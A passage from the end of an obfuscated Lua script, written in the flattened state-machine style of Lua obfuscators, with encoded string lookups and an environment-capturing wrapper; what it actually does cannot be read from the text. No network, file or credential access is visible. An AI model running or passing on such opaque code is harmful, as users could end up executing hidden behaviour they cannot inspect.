p=-388075-(-388076)n=C[g[649655-649652]]s=n~=p d=s and 14175952-(-832250)or 1025152+829880 else d=5764304-690741 end end end else if d<-66786+15350103 then if d<522928+14557741 then if d<14687696-(-320682)then if d<281001+14717260 then q=-156581+156582 k=964863-964862 r=#c Y=p(k,r)k=I(c,Y)Y=nil r=C[j]y=k-q d=2092511-(-253032)T=M(y)r[k]=T k=nil else u=-49890+49903 n=C[g[969022+-969019]]p=-1030912+1030944 s=n%p G=C[g[-203878+203882]]M=C[g[1008449-1008447]]Q=273194-273192 Y=C[g[-121185-(-121188)]]c=Y-s Y=62530-62498 j=c/Y t=u-j H=Q^t I=M/H a=G(I)G=64930+4294902366 H=628660-628659 p=a%G a=-194660-(-194662)G=a^s n=p/G G=C[g[452078+-452074]]M=n%H H=742775+4294224521 I=M*H a=G(I)G=C[g[777212-777208]]I=G(n)M=-713080-(-778616)Q=-288937-(-289193)p=a+I a=-325418+390954 G=p%a I=p-G a=I/M M=121572+-121316 I=G%M p=nil H=G-I M=H/Q d=5368708-698102 n=nil Q=-764472-(-764728)u=323434-323178 G=nil H=a%Q t=a-H Q=t/u a=nil t={I;M;H,Q}Q=nil s=nil C[g[-722485-(-722486)]]=t M=nil I=nil H=nil end else Q=J()c=W(839551-813561)C[Q]=A d=C[M]t=-731319+731322 u=165093+-165028 A=d(t,u)d=-664373-(-664373)t=J()C[t]=A z=W(-82451-(-108451))Y=v(-655284+6640747,{})u=d d=586994+-586994 A=l[c]j=d c={A(Y)}d={B(c)}c=d A=-363243+363245 d=c[A]A=W(-249256+275260)Y=d d=l[A]k=C[p]E=l[z]z=E(Y)E=W(-862331-(-888316))e=k(z,E)k={e()}A=d(B(k))k=J()C[k]=A A=-286441+286442 e=C[t]E=e e=-893947-(-893948)z=e e=541297+-541297 r=z<e d=3600334-914812 e=A-z end else if d<15838917-739447 then G=nil d=951037+4122526 M=nil I=nil else t=W(428318-402284)d=-217767+15226481 Q=l[t]A=Q end end else if d<16230622-177638 then if d<16560873-601203 then C[g[629945-629940]]=A s=nil d=15911814-(-57954)else d=C[g[-916988+916995]]d=d and 736567+9626629 or-882555+5388292 end else if d<-524784+17041183 then r=-433069+433075 z=-272808+272809 d=C[M]E=d(z,r)d=W(-77922+103935)l[d]=E r=W(-991167+1017180)z=l[r]r=299883-299881 d=z>r d=d and-572594+14277717 or 1402186-749367 else a=-875195+875197 n=C[g[-543025+543026]]G=-379052+379053 p=n(G,a)n=890108+-890107 s=p==n A=s d=s and 442734+2668273 or 1908634-(-71842)end end end end end end end d=#V return B(A)end return(a(-108131+2930361,{}))(B(A))end)(getfenv and getfenv()or _ENV,unpack or table[W(-185653-(-211687))],newproxy,setmetatable,getmetatable,select,{...})end)(...)
